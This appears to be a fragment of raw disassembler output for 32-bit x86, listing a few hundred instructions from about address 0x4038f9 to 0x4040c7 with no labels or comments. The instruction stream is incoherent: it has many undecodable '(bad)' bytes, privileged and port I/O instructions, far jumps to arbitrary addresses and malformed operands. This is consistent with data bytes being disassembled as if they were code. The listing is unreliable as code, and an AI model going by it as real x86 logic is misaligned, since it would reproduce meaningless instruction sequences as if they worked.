  4038f9:	stos   BYTE PTR es:[edi],al
  4038fa:	repz push esi
  4038fc:	dec    edi
  4038fd:	or     al,0xd7
  4038ff:	repnz add ebp,ebx
  403902:	in     eax,dx
  403903:	pop    eax
  403904:	enter  0x3079,0xc4
  403908:	jne    0x4038be
  40390a:	gs add ebx,0xc60e8e26
  403911:	mov    DWORD PTR [ebp+0x38ac0ae8],0xb6de10bf
  40391b:	ds out 0x33,al
  40391e:	enter  0x43c8,0xde
  403922:	(bad)  
  403923:	pop    esp
  403924:	adc    BYTE PTR [edx-0x60bdec16],0x20
  40392b:	inc    edi
  40392c:	or     ch,BYTE PTR [ebx]
  40392e:	cmc    
  40392f:	fsubrp st(7),st
  403931:	imul   ebx,DWORD PTR [ecx-0x5257b391],0x1c
  403938:	dec    ebp
  403939:	int3   
  40393a:	aas    
  40393b:	stos   DWORD PTR es:[edi],eax
  40393c:	jle    0x403924
  40393e:	outs   dx,DWORD PTR ds:[esi]
  40393f:	dec    esi
  403940:	enter  0xe5c9,0x62
  403944:	and    ch,cl
  403946:	cmp    al,0xa6
  403948:	fisubr DWORD PTR [esp+edi*4+0x1f]
  40394c:	stos   BYTE PTR es:[edi],al
  40394d:	scas   al,BYTE PTR es:[edi]
  40394e:	jb     0x403986
  403950:	in     al,0xa1
  403952:	xor    dl,0x33
  403955:	cmp    BYTE PTR [eax],0xb3
  403958:	repz jmp 0x21dd8234
  40395e:	xor    dh,al
  403960:	enter  0xf8f8,0x2b
  403964:	imul   esp,DWORD PTR [edx-0x75],0xcdaa4b67
  40396b:	mov    BYTE PTR [edx],cl
  40396d:	push   ebp
  40396e:	add    ah,BYTE PTR [ebx+0x2a]
  403971:	out    dx,al
  403972:	sbb    dl,BYTE PTR [esp+ebx*8]
  403975:	gs pop esp
  403977:	mov    edi,0x59e9979a
  40397c:	add    DWORD PTR [edi+ebx*1],ebp
  40397f:	sub    eax,0x2ffdc1ea
  403984:	or     eax,0x65d58b
  403989:	xchg   BYTE PTR [esi-0x7c98b0a3],dl
  40398f:	xlat   BYTE PTR ds:[ebx]
  403990:	sbb    bh,BYTE PTR [eax+0x42]
  403993:	dec    eax
  403994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403995:	(bad)  
  403997:	adc    BYTE PTR [ebp-0x56ef9e08],bl
  40399d:	cmp    bl,BYTE PTR [ebp+0x70]
  4039a0:	pushf  
  4039a1:	mov    ah,BYTE PTR gs:[esi]
  4039a4:	pop    ecx
  4039a5:	shr    BYTE PTR [ebx],cl
  4039a7:	and    eax,0x14debbfe
  4039ac:	fild   WORD PTR [edi+0x13]
  4039af:	push   ss
  4039b0:	fs cmp eax,0x22be5a7c
  4039b6:	test   DWORD PTR [ebp+0xb],eax
  4039b9:	inc    esp
  4039ba:	shr    ecx,1
  4039bc:	ror    dl,0x25
  4039bf:	lods   eax,DWORD PTR ds:[esi]
  4039c0:	data16 mov al,0xa3
  4039c3:	push   eax
  4039c4:	jg     0x4039a0
  4039c6:	jne    0x4039b3
  4039c8:	jmp    0xdc7643cb
  4039cd:	vandpd ymm4,ymm3,YMMWORD PTR [edx+0x19cfe179]
  4039d5:	push   0xc0b2f761
  4039da:	xor    eax,0x5bdc9e0b
  4039df:	mov    ecx,0xbdc1a19d
  4039e4:	sbb    cl,BYTE PTR [ebx-0x7a975a90]
  4039ea:	mov    dl,0xbe
  4039ec:	lods   al,BYTE PTR ds:[esi]
  4039ed:	stos   BYTE PTR es:[edi],al
  4039ee:	cwde   
  4039ef:	fld    TBYTE PTR [edi-0x344644a6]
  4039f5:	int3   
  4039f6:	add    al,0x77
  4039f8:	pop    ebp
  4039f9:	cmc    
  4039fa:	sbb    al,0x13
  4039fc:	push   ebx
  4039fd:	popa   
  4039fe:	mov    es,edx
  403a00:	adc    eax,0xf95b7ad5
  403a05:	in     al,dx
  403a06:	lock pop es
  403a08:	in     eax,dx
  403a09:	cmp    al,0xaa
  403a0b:	sbb    al,0x39
  403a0d:	sbb    eax,0x8535115a
  403a12:	into   
  403a13:	jae    0x403a2f
  403a15:	jb     0x4039a9
  403a17:	pop    ebx
  403a18:	mov    ecx,0xc495aee
  403a1d:	mov    WORD PTR [edx+0x1d],cs
  403a20:	dec    edx
  403a21:	mov    ah,0x96
  403a23:	or     DWORD PTR [edx],edi
  403a25:	rol    BYTE PTR [ebp+0x2f3327b3],0x62
  403a2c:	mov    esp,0x68d3b304
  403a31:	xor    DWORD PTR [ecx+esi*1+0x16],ebp
  403a35:	nop
  403a36:	retf   0x5773
  403a39:	std    
  403a3a:	inc    eax
  403a3b:	or     al,0xeb
  403a3d:	nop
  403a3e:	xor    edi,esp
  403a40:	rcl    BYTE PTR [ecx-0x57848b85],cl
  403a46:	jge    0x403a86
  403a48:	call   0xb5fa:0xfe4a924a
  403a4f:	(bad)  
  403a50:	jae    0x403a7b
  403a52:	es enter 0xe614,0x1a
  403a57:	rol    dh,1
  403a59:	or     esi,DWORD PTR cs:[eax-0x2a]
  403a5d:	push   ecx
  403a5e:	out    0x9f,al
  403a60:	push   edi
  403a61:	in     eax,dx
  403a62:	xchg   edx,eax
  403a63:	dec    ebx
  403a64:	mov    edi,edi
  403a66:	stos   DWORD PTR es:[edi],eax
  403a67:	xor    ah,BYTE PTR [edi-0x711c07ce]
  403a6d:	mov    ch,BYTE PTR [eax-0x2ef9fc8f]
  403a73:	mov    ebp,0x1a69b35d
  403a78:	xor    eax,0x71dbaf75
  403a7d:	adc    DWORD PTR [edi],0xf2743ca5
  403a83:	dec    ecx
  403a84:	fcom   QWORD PTR [esi+ecx*1+0x3c9b6955]
  403a8b:	into   
  403a8c:	inc    edi
  403a8d:	out    0xad,eax
  403a8f:	ret    0xb676
  403a92:	jb     0x403ada
  403a94:	mov    dh,0x5d
  403a96:	jp     0x403a8a
  403a98:	mov    dh,0xe1
  403a9a:	and    al,0x47
  403a9c:	pop    es
  403a9d:	shr    DWORD PTR [edi],0x80
  403aa0:	stos   DWORD PTR es:[edi],eax
  403aa1:	xlat   BYTE PTR ds:[ebx]
  403aa2:	xchg   BYTE PTR [esi+eax*8-0x5a92bf8a],ah
  403aa9:	ret    
  403aaa:	lods   eax,DWORD PTR ds:[esi]
  403aab:	mov    dl,al
  403aad:	call   0x9a63:0x57e2a4fd
  403ab4:	xor    BYTE PTR [esi],0x52
  403ab7:	add    BYTE PTR [eax+0x7e],0xe8
  403abb:	cdq    
  403abc:	pop    ebp
  403abd:	cmc    
  403abe:	push   esi
  403abf:	mov    BYTE PTR [edi-0x7ad64a1c],ah
  403ac5:	inc    esp
  403ac6:	push   ss
  403ac7:	(bad)  
  403ac8:	pusha  
  403ac9:	push   edi
  403aca:	call   0xa9e5:0xd74874d0
  403ad1:	in     eax,dx
  403ad2:	cli    
  403ad3:	ss and al,0x23
  403ad6:	popf   
  403ad7:	xor    DWORD PTR [ebx],0xffffff8e
  403ada:	test   ax,0x3f4b
  403ade:	call   0x4c2e:0xd1ec2e38
  403ae5:	push   es
  403ae6:	push   ds
  403ae7:	sahf   
  403ae8:	(bad)  
  403ae9:	pusha  
  403aea:	fmul   QWORD PTR [edi+0x19cde58c]
  403af0:	arpl   WORD PTR [edx-0x1b],cx
  403af3:	dec    esp
  403af4:	jnp    0x403b30
  403af6:	pusha  
  403af7:	fild   QWORD PTR [edi]
  403af9:	std    
  403afa:	push   ds
  403afb:	pop    eax
  403afc:	call   WORD PTR gs:0xb8c1c7f1
  403b04:	lods   eax,DWORD PTR ds:[esi]
  403b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b06:	arpl   WORD PTR [esi+0x56],bx
  403b09:	es loopne 0x403ac6
  403b0c:	gs in  al,0x69
  403b0f:	retf   
  403b10:	(bad)
  403b14:	imul   esi,ecx,0xffffffc8
  403b17:	dec    ebx
  403b18:	out    0x6,eax
  403b1a:	cdq    
  403b1b:	push   edi
  403b1c:	icebp  
  403b1d:	mov    cl,0xc2
  403b1f:	push   ecx
  403b20:	daa    
  403b21:	sar    DWORD PTR [ebx+esi*2],1
  403b24:	jno    0x403b27
  403b26:	sbb    dl,0x7b
  403b29:	adc    DWORD PTR [ecx+0x22],ebp
  403b2c:	arpl   bx,dx
  403b2e:	mov    edx,0x574a2b2f
  403b33:	int    0x1d
  403b35:	or     DWORD PTR [ebp+0x4c],ebx
  403b38:	mov    edx,0xe329654a
  403b3d:	or     DWORD PTR [edx+0x24],edx
  403b40:	xchg   ebp,eax
  403b41:	sub    eax,esp
  403b43:	mov    ebx,0xe54dec8e
  403b48:	call   0x7e2c:0xce41d0e5
  403b4f:	lds    ebx,FWORD PTR [esi+edx*1]
  403b52:	add    BYTE PTR [eax+0x1d64c9dc],dh
  403b58:	and    eax,0xb82ad32d
  403b5d:	and    al,0x1d
  403b5f:	ds icebp 
  403b61:	xor    esp,DWORD PTR [esi]
  403b63:	mov    ebx,0x6627d3c1
  403b68:	aad    0x48
  403b6a:	imul   ecx,DWORD PTR [esi+0x4e54e5b6],0xd50883f2
  403b74:	pop    esi
  403b75:	ins    BYTE PTR es:[edi],dx
  403b76:	mov    ch,0x96
  403b78:	cmp    esp,ecx
  403b7a:	pop    ecx
  403b7b:	push   ebp
  403b7c:	je     0x403b56
  403b7e:	push   cs
  403b7f:	mov    BYTE PTR [ecx+ecx*1],0x82
  403b83:	sar    DWORD PTR [edi-0x5d],cl
  403b86:	push   0x74687317
  403b8b:	sub    edx,DWORD PTR [edx+ecx*8-0x2a]
  403b8f:	fdivr  QWORD PTR fs:[ecx+0x39]
  403b93:	push   esi
  403b94:	sub    DWORD PTR [ebx],ecx
  403b96:	jbe    0x403b8b
  403b98:	mov    eax,ds:0x9d8710de
  403b9d:	clc    
  403b9e:	jmp    0x77f15c8
  403ba3:	jae    0x403b7d
  403ba5:	add    ebx,DWORD PTR [ecx+eiz*1]
  403ba8:	xor    bl,al
  403baa:	aam    0x10
  403bac:	leave  
  403bad:	stos   BYTE PTR es:[edi],al
  403bae:	(bad)
  403bb2:	lahf   
  403bb3:	call   0xa7735703
  403bb8:	push   eax
  403bb9:	into   
  403bba:	fwait
  403bbb:	std    
  403bbc:	hlt    
  403bbd:	mov    ch,0x69
  403bbf:	jmp    0x8093:0xfbc443e5
  403bc6:	iret   
  403bc7:	mov    ebp,0xbaf83814
  403bcc:	jo     0x403b83
  403bce:	jl     0x403b66
  403bd0:	div    BYTE PTR [eax]
  403bd2:	rol    DWORD PTR [ebx+0x6d73eda7],0x4a
  403bd9:	jmp    0xeafcb10c
  403bde:	rep lods al,BYTE PTR ds:[esi]
  403be0:	pop    ecx
  403be1:	adc    eax,0xb09c8bbb
  403be6:	shl    BYTE PTR [esi+0x4abbd022],1
  403bec:	jge    0x403c26
  403bee:	jae    0x403c11
  403bf0:	test   eax,0xb08580b3
  403bf5:	inc    esi
  403bf6:	into   
  403bf7:	es nop
  403bf9:	jnp    0x403c2c
  403bfb:	in     al,0x3b
  403bfd:	cmc    
  403bfe:	fsubrp st(6),st
  403c00:	in     al,dx
  403c01:	pop    ss
  403c02:	cdq    
  403c03:	add    al,ch
  403c05:	shl    BYTE PTR [edi+0x69],0xef
  403c09:	pop    edi
  403c0a:	xchg   ebx,eax
  403c0b:	fcomi  st,st(2)
  403c0d:	add    al,0xe9
  403c0f:	or     dl,BYTE PTR [edi]
  403c11:	dec    edi
  403c12:	aad    0x77
  403c14:	shl    DWORD PTR [eax-0x2c2c42dd],1
  403c1a:	sbb    ebx,ebx
  403c1c:	and    al,BYTE PTR [edi]
  403c1e:	test   bh,dl
  403c20:	in     eax,dx
  403c21:	add    BYTE PTR [ebx],0x71
  403c24:	retf   0xd2ad
  403c27:	ror    al,0xca
  403c2a:	idiv   ebp
  403c2c:	cli    
  403c2d:	xchg   edi,eax
  403c2e:	test   ebx,0xa7e9d602
  403c34:	and    edx,DWORD PTR ds:0x959f1211
  403c3a:	sbb    ebx,edx
  403c3c:	fild   DWORD PTR [eax+eiz*1-0x2f58af17]
  403c43:	sti    
  403c44:	xchg   DWORD PTR [edx],esp
  403c46:	xor    BYTE PTR [eax],0x4c
  403c49:	repnz sbb BYTE PTR [esi-0x79],ch
  403c4d:	loope  0x403bef
  403c4f:	addr16 pop ds
  403c51:	(bad)  
  403c52:	jp     0x403c69
  403c54:	xor    eax,edi
  403c56:	inc    esp
  403c57:	call   0xbb3bb546
  403c5c:	push   esi
  403c5d:	xchg   edi,eax
  403c5e:	add    al,0x49
  403c60:	(bad)  
  403c61:	mov    al,0x6
  403c63:	fs iret 
  403c65:	sbb    BYTE PTR [edx+ebp*8],ah
  403c68:	add    DWORD PTR [edx],0xeb42ae4a
  403c6e:	test   edi,0xfff9b586
  403c74:	push   edx
  403c75:	leave  
  403c76:	retf   
  403c77:	dec    esp
  403c78:	js     0x403ceb
  403c7a:	fs sbb al,0x30
  403c7d:	cmc    
  403c7e:	mov    edx,0xf8541cac
  403c83:	dec    edi
  403c84:	and    DWORD PTR [eax],eax
  403c86:	pop    edx
  403c87:	leave  
  403c88:	push   0x6d801d7c
  403c8d:	outs   dx,BYTE PTR ds:[esi]
  403c8e:	sar    ebp,0xf6
  403c91:	inc    edx
  403c92:	aad    0x28
  403c94:	push   0xec8ddbf4
  403c99:	test   BYTE PTR [edx+edx*1+0x64],ch
  403c9d:	lods   eax,DWORD PTR ds:[esi]
  403c9e:	adc    eax,DWORD PTR [ebp+0x59]
  403ca1:	icebp  
  403ca2:	sub    DWORD PTR [esi-0x389014fc],ebx
  403ca8:	inc    ebp
  403ca9:	xor    edx,esi
  403cab:	mov    ebp,0xadde730
  403cb0:	mov    BYTE PTR [ecx+0x41373dc],dh
  403cb6:	xor    eax,0xec94ec94
  403cbb:	bound  edx,QWORD PTR [eax+0x36]
  403cbe:	shl    al,0xb9
  403cc1:	iret   
  403cc2:	mov    dh,0x1a
  403cc4:	pushf  
  403cc5:	xchg   edi,eax
  403cc6:	sub    al,0xf7
  403cc8:	push   ebp
  403cc9:	or     al,0x21
  403ccb:	cs jne 0x403c8f
  403cce:	ror    BYTE PTR [esi+edi*4+0x5f],1
  403cd2:	rcr    BYTE PTR [ebp-0x4b6d2a81],cl
  403cd8:	and    BYTE PTR [ecx-0x2574f65f],0x5a
  403cdf:	ds retf 0xefd5
  403ce3:	outs   dx,BYTE PTR ds:[esi]
  403ce4:	and    edx,DWORD PTR [eax-0x30c64e06]
  403cea:	mov    al,0xa7
  403cec:	cmp    BYTE PTR [esi+eax*1-0x22],bh
  403cf0:	push   esi
  403cf1:	pop    ecx
  403cf2:	and    ah,ch
  403cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cf5:	mov    eax,0x490a8811
  403cfa:	inc    eax
  403cfb:	mov    ebx,eax
  403cfd:	xor    DWORD PTR [edx-0x3a2f3374],0x40ee2ea5
  403d07:	sbb    DWORD PTR [ecx-0x72],edi
  403d0a:	cs jp  0x403d6c
  403d0d:	or     ebp,edx
  403d0f:	xchg   edi,ebx
  403d11:	cld    
  403d12:	mov    ebp,0xf000034e
  403d17:	loope  0x403cbe
  403d19:	mov    bl,0x1
  403d1b:	sub    BYTE PTR [esi+0x5d],bl
  403d1e:	rcl    DWORD PTR [edi],0xa5
  403d21:	sbb    DWORD PTR [edx+0x248d6c56],eax
  403d27:	xchg   BYTE PTR [eax-0x1e],al
  403d2a:	adc    DWORD PTR [edx-0x75],0x464e2a54
  403d31:	sar    BYTE PTR [ecx+0x47],0x9e
  403d35:	lods   al,BYTE PTR ds:[esi]
  403d36:	inc    edx
  403d37:	outs   dx,BYTE PTR ds:[esi]
  403d38:	retf   
  403d39:	jne    0x403dac
  403d3b:	mov    ?,WORD PTR [edx-0x5c]
  403d3e:	mov    dl,BYTE PTR [esi+0x6f3182c6]
  403d44:	mov    edx,0x759c5dc4
  403d49:	mov    al,0x1e
  403d4b:	shl    edi,cl
  403d4d:	es sub ch,al
  403d50:	stos   BYTE PTR es:[edi],al
  403d51:	mov    edi,0xfc3af9c7
  403d56:	sbb    BYTE PTR [edx],0x6f
  403d59:	neg    DWORD PTR [edi]
  403d5b:	clc    
  403d5c:	or     bl,dh
  403d5e:	xchg   ebp,eax
  403d5f:	pop    ecx
  403d60:	xor    edx,edx
  403d62:	gs xor eax,0x7fd5622
  403d68:	and    al,0xf1
  403d6a:	jbe    0x403d59
  403d6c:	fimul  WORD PTR [ebp+0x39]
  403d6f:	pop    ebp
  403d70:	dec    esp
  403d71:	outs   dx,DWORD PTR ds:[esi]
  403d72:	mov    eax,0xab036e4
  403d77:	icebp  
  403d78:	adc    al,0xf4
  403d7a:	data16 jge 0x403dd5
  403d7d:	mov    bl,0x41
  403d7f:	out    0xfa,al
  403d81:	pusha  
  403d82:	fcmovbe st,st(3)
  403d84:	cmp    eax,0x98ef8320
  403d89:	mov    edx,fs
  403d8b:	jle    0x403de4
  403d8d:	cmp    bh,bl
  403d8f:	push   ecx
  403d90:	pop    eax
  403d91:	mov    ah,0x99
  403d93:	popf   
  403d94:	xchg   BYTE PTR [esi-0x4e],bh
  403d97:	adc    cl,BYTE PTR [edx]
  403d99:	repnz dec eax
  403d9b:	stos   BYTE PTR es:[edi],al
  403d9c:	outs   dx,DWORD PTR ds:[esi]
  403d9d:	and    DWORD PTR [edx-0x60],esi
  403da0:	dec    ebp
  403da1:	mov    ebp,0xa765c4af
  403da6:	icebp  
  403da7:	addr16 cwde 
  403da9:	sub    cl,BYTE PTR [eax+edi*4]
  403dac:	aad    0xa7
  403dae:	(bad)  [eax]
  403db0:	arpl   WORD PTR [edi+0x72],sp
  403db3:	in     eax,0xd6
  403db5:	push   cs
  403db6:	or     bl,bh
  403db8:	(bad)  
  403dba:	dec    ebp
  403dbb:	mov    bl,0x58
  403dbd:	push   esp
  403dbe:	push   edx
  403dbf:	lock sbb eax,DWORD PTR [ebx]
  403dc2:	scas   al,BYTE PTR es:[edi]
  403dc3:	lods   eax,DWORD PTR ds:[esi]
  403dc4:	push   edx
  403dc5:	retf   
  403dc6:	or     al,0x15
  403dc8:	loop   0x403d84
  403dca:	pop    ebx
  403dcb:	pushf  
  403dcc:	pop    ss
  403dcd:	je     0x403d50
  403dcf:	stos   BYTE PTR es:[edi],al
  403dd0:	mov    gs,esi
  403dd2:	xchg   ebx,eax
  403dd3:	mov    ds:0xe23c864d,eax
  403dd8:	mov    WORD PTR [ecx+0xc],es
  403ddb:	dec    edx
  403ddc:	or     ebp,DWORD PTR [esi]
  403dde:	dec    esp
  403ddf:	(bad)  
  403de0:	fisttp DWORD PTR [esi]
  403de2:	or     DWORD PTR [edi],ecx
  403de4:	xchg   ecx,eax
  403de5:	leave  
  403de6:	xor    cl,BYTE PTR [edx]
  403de8:	xor    BYTE PTR ds:0x1e4bfdc3,bl
  403dee:	push   0xecc5199b
  403df3:	repnz dec ebx
  403df5:	sbb    BYTE PTR [edi-0x47],al
  403df8:	int3   
  403df9:	out    0x6f,eax
  403dfb:	aaa    
  403dfc:	imul   ebx,DWORD PTR [esi],0x70
  403dff:	sub    BYTE PTR [edi-0x74],ah
  403e02:	xor    dh,BYTE PTR [edx]
  403e04:	sub    eax,DWORD PTR ds:0xdf05caa8
  403e0a:	inc    ecx
  403e0b:	popa   
  403e0c:	sbb    ebx,ecx
  403e0e:	dec    edx
  403e0f:	out    dx,al
  403e10:	or     eax,0x7573b61a
  403e15:	mov    bl,dh
  403e17:	dec    ebx
  403e18:	loope  0x403e8a
  403e1a:	test   eax,0xa2a9e572
  403e1f:	pop    esi
  403e20:	sub    dl,BYTE PTR [edi-0x7f]
  403e23:	pop    esp
  403e24:	xlat   BYTE PTR ds:[ebx]
  403e25:	popf   
  403e26:	xor    al,0x1f
  403e28:	test   DWORD PTR [edi+0x1567e632],eax
  403e2e:	in     al,dx
  403e2f:	mov    edi,0x1700ee1b
  403e34:	mov    ebx,edx
  403e36:	add    DWORD PTR [edi-0x1c140cda],0x23
  403e3d:	(bad)  
  403e3e:	stos   DWORD PTR es:[edi],eax
  403e3f:	out    0x3f,al
  403e41:	pop    eax
  403e42:	lahf   
  403e43:	pushf  
  403e44:	xchg   ch,al
  403e46:	outs   dx,BYTE PTR ds:[esi]
  403e47:	jmp    0xb13b43b4
  403e4c:	imul   edx,DWORD PTR [edx+ecx*8],0x22afba4a
  403e53:	outs   dx,DWORD PTR ds:[esi]
  403e54:	mov    BYTE PTR [ebx-0x3e589573],dl
  403e5a:	pop    ebx
  403e5b:	xor    BYTE PTR [eax-0x1e0f26f0],al
  403e61:	lahf   
  403e62:	push   ebp
  403e63:	in     al,dx
  403e64:	sub    esi,DWORD PTR [edx]
  403e66:	jp     0x403ebd
  403e68:	fdivr  st(1),st
  403e6a:	xchg   ebp,eax
  403e6b:	cmp    al,0x9f
  403e6d:	ja     0x403e22
  403e6f:	repnz (bad) 
  403e71:	pusha  
  403e72:	das    
  403e73:	mov    edi,0xaf97e4ef
  403e78:	jne    0x403e54
  403e7a:	dec    ebx
  403e7b:	dec    ebx
  403e7c:	lds    edx,FWORD PTR [ebp+esi*1-0x4a]
  403e80:	pop    ebx
  403e81:	inc    edi
  403e82:	xchg   edi,eax
  403e83:	jmp    0x403ebf
  403e85:	mov    DWORD PTR [edx],edx
  403e87:	adc    eax,0xcd6b928f
  403e8c:	xlat   BYTE PTR ds:[ebx]
  403e8d:	out    0xb8,eax
  403e8f:	or     DWORD PTR [ebx+esi*8+0x50],esp
  403e93:	popa   
  403e94:	call   DWORD PTR [edi+0x282bf466]
  403e9a:	push   0xffffffdb
  403e9c:	sub    esi,DWORD PTR [esi-0x70ba9a94]
  403ea2:	pop    esi
  403ea3:	mov    edi,0x66a3c2c9
  403ea8:	mov    dh,0x39
  403eaa:	jl     0x403e6b
  403eac:	mov    esi,0xc2b17ac6
  403eb1:	(bad)  
  403eb2:	(bad)  
  403eb3:	fwait
  403eb4:	lods   al,BYTE PTR ds:[esi]
  403eb5:	gs jo  0x403eba
  403eb8:	dec    esi
  403eb9:	dec    ecx
  403eba:	mov    eax,edi
  403ebc:	xchg   edx,eax
  403ebd:	nop
  403ebe:	cmp    DWORD PTR [ebx-0x7302e35b],0x19e149b2
  403ec8:	jmp    0x403f44
  403eca:	fs iret 
  403ecc:	and    bh,BYTE PTR [eax+0x3a9f6872]
  403ed2:	cmp    BYTE PTR ds:0xa663cd6f,dl
  403ed8:	mov    edx,0x52ee8325
  403edd:	xchg   edi,eax
  403ede:	mov    eax,ds:0x18ae41a2
  403ee3:	stos   DWORD PTR es:[edi],eax
  403ee4:	jae    0x403ea1
  403ee6:	imul   esi,DWORD PTR [ebx+eax*1-0xf],0xce663e8b
  403eee:	add    edx,eax
  403ef0:	sub    al,0x9c
  403ef2:	push   ecx
  403ef3:	call   0x5c046382
  403ef8:	xor    esi,eax
  403efa:	sahf   
  403efb:	push   esi
  403efc:	and    eax,0xfb71bcbd
  403f01:	and    BYTE PTR cs:[edi+0x49],0xf
  403f06:	sub    al,0xec
  403f08:	fcomp  QWORD PTR ds:0x6dd9e9c9
  403f0e:	add    BYTE PTR [esi-0x129aba59],0xee
  403f15:	mov    bl,BYTE PTR [eax-0x4bbc710d]
  403f1b:	xor    BYTE PTR [edx],dh
  403f1d:	bound  esp,QWORD PTR [eax-0x1b]
  403f20:	enter  0x415c,0x62
  403f24:	xchg   DWORD PTR [eax+edi*2-0x75ff0e3f],eax
  403f2b:	dec    eax
  403f2c:	fxam   
  403f2e:	ret    
  403f2f:	mov    dl,0x78
  403f31:	xchg   BYTE PTR [ecx],al
  403f33:	(bad)  
  403f34:	xor    eax,0xac05d441
  403f39:	mov    edi,gs
  403f3b:	add    DWORD PTR [ebp+eiz*8-0x540b0c96],edi
  403f42:	cmp    bh,BYTE PTR [esi+0x24e02ffb]
  403f48:	xor    bl,BYTE PTR [ebx+0x5b]
  403f4b:	or     al,0x9c
  403f4d:	or     BYTE PTR [ebx],ch
  403f4f:	stc    
  403f50:	dec    edx
  403f51:	invd   
  403f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f54:	jno    0x403edb
  403f56:	in     eax,0x90
  403f58:	imul   esp,DWORD PTR [ebp+eax*8+0x7fd74313],0x2da2fa2
  403f63:	push   ss
  403f64:	out    dx,al
  403f65:	push   edx
  403f66:	sbb    eax,0xd4439ccb
  403f6b:	add    eax,0xffffffa5
  403f6e:	call   FWORD PTR [edx+0x5f]
  403f71:	ret    0x823a
  403f74:	xchg   esi,eax
  403f75:	mov    cl,0xb9
  403f77:	and    DWORD PTR [ecx],edi
  403f79:	cdq    
  403f7a:	and    al,0xb5
  403f7c:	sbb    al,0xcb
  403f7e:	push   edi
  403f7f:	dec    esi
  403f80:	mov    ebp,ebx
  403f82:	jmp    0x3d11072c
  403f87:	add    esp,DWORD PTR [ebx]
  403f89:	ror    DWORD PTR [ecx+eiz*8-0x71],1
  403f8d:	jo     0x403fc1
  403f8f:	and    cl,BYTE PTR [edx+0x64eab354]
  403f95:	and    eax,0x39519dcc
  403f9a:	or     eax,0xb70075e9
  403f9f:	push   0x102e3dcc
  403fa4:	cmp    DWORD PTR [edi+0x68],ebx
  403fa7:	xchg   ecx,eax
  403fa8:	enter  0xdbe4,0x8e
  403fac:	hlt    
  403fad:	sub    ecx,edi
  403faf:	sbb    eax,0x2ba312ad
  403fb5:	out    0x8c,al
  403fb7:	cmp    eax,0xb64cca96
  403fbc:	jmp    0x403f5f
  403fbe:	outs   dx,DWORD PTR ds:[esi]
  403fbf:	int    0x6d
  403fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fc2:	pop    ebp
  403fc3:	ja     0x404033
  403fc5:	pop    eax
  403fc6:	into   
  403fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fc8:	inc    ebp
  403fc9:	scas   al,BYTE PTR es:[edi]
  403fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fcb:	out    dx,eax
  403fcc:	(bad)  
  403fcf:	repz jmp 0xc4a0dcb5
  403fd5:	bound  ebx,QWORD PTR [eax+0x59]
  403fd8:	xlat   BYTE PTR ds:[ebx]
  403fd9:	aas    
  403fda:	push   ss
  403fdb:	sub    BYTE PTR [eax],dl
  403fdd:	jp     0x403fcf
  403fdf:	stc    
  403fe0:	inc    esp
  403fe1:	inc    ebp
  403fe2:	fimul  DWORD PTR [edx]
  403fe4:	leave  
  403fe5:	sub    bh,al
  403fe7:	pop    edi
  403fe8:	pop    ss
  403fe9:	jmp    0x461fde1
  403fee:	sub    BYTE PTR [ecx+0x14cdaca],bh
  403ff4:	push   edi
  403ff5:	or     esi,edx
  403ff7:	dec    edx
  403ff8:	mov    ah,0xd2
  403ffa:	mov    ecx,0x257ca668
  403fff:	inc    esp
  404000:	jmp    0x5946:0x2461d33c
  404007:	dec    eax
  404008:	outs   dx,DWORD PTR ds:[esi]
  404009:	adc    eax,0xee5b6357
  40400e:	add    DWORD PTR [edx],ebp
  404010:	add    al,0x13
  404012:	fcom   QWORD PTR [edi+0x65]
  404015:	push   ss
  404016:	push   esi
  404017:	xor    BYTE PTR ds:0x5e33ffff,al
  40401d:	aaa    
  40401e:	mov    ?,WORD PTR [ebx+0x38]
  404021:	cmc    
  404022:	fld    DWORD PTR [ebx-0x4b]
  404025:	(bad)  
  404026:	fistp  QWORD PTR [edx]
  404028:	mov    dh,0x1c
  40402a:	or     esi,ebp
  40402c:	sbb    BYTE PTR [edx],al
  40402e:	push   ebx
  40402f:	sub    cl,dl
  404031:	push   ebx
  404032:	mov    ch,0x21
  404034:	mov    ebx,0x7a8a6c8a
  404039:	stos   DWORD PTR es:[edi],eax
  40403a:	bound  ebx,QWORD PTR [esi-0x4d3a5fc3]
  404040:	cmp    al,0xdb
  404042:	leave  
  404043:	sti    
  404044:	sbb    DWORD PTR [ecx+0x78],ebx
  404047:	mov    eax,ds:0xacebdfc4
  40404c:	retf   
  40404d:	call   0x8dd6b917
  404052:	fimul  WORD PTR [edx]
  404054:	inc    edx
  404055:	adc    al,dh
  404057:	rol    DWORD PTR [edx],0x5b
  40405a:	icebp  
  40405b:	test   BYTE PTR [ecx],0x46
  40405e:	popf   
  40405f:	les    ebp,FWORD PTR [eax+0x34d8304c]
  404065:	jb     0x403fe7
  404067:	jb     0x40405c
  404069:	inc    edi
  40406a:	or     BYTE PTR [edx+0x31],bl
  40406d:	jle    0x404063
  40406f:	and    al,0xcc
  404071:	mov    al,ds:0x4dac81a0
  404076:	push   DWORD PTR ds:0x884d06aa
  40407c:	inc    esp
  40407d:	(bad)  
  40407f:	cs or  dl,dl
  404082:	sub    BYTE PTR [ecx+0x1bc6f89d],0xfa
  404089:	xor    eax,0x34f1c64f
  40408e:	pop    edx
  40408f:	mov    esp,fs
  404091:	or     cl,BYTE PTR [edx]
  404093:	sti    
  404094:	fnstcw WORD PTR [ebp-0x18]
  404097:	call   0xf7fe:0xa5162aff
  40409e:	adc    al,0x86
  4040a0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a2:	jo     0x40407a
  4040a4:	sub    al,0x3d
  4040a6:	add    BYTE PTR [ebx],ch
  4040a8:	mov    DWORD PTR [ecx],eax
  4040aa:	mov    DWORD PTR [esp],esp
  4040ad:	sub    ebp,edx
  4040af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040b0:	icebp  
  4040b1:	mov    DWORD PTR [ecx],esp
  4040b3:	jo     0x4040eb
  4040b5:	stos   DWORD PTR es:[edi],eax
  4040b6:	outs   dx,DWORD PTR ds:[esi]
  4040b7:	or     esi,DWORD PTR [edi+0x56aa88aa]
  4040bd:	add    dh,cl
  4040bf:	call   0x1e497bf6
  4040c4:	pop    ds
  4040c5:	sub    al,0x6f
  4040c7:	dec    di
